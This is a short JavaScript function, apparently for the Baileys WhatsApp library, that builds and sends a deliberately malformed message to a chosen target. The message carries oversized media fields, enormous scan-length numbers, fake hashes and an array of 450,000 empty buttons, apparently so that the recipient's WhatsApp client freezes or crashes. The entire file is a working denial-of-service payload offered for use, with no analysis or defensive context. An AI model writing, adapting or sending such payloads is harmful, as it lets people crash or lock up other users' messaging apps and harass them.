async function StuckLogo(sock, target) {
  const CodeC = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
                 text: "— Heksen - Jahat#",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

  const msg = generateWAMessageFromContent(target, CodeC, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}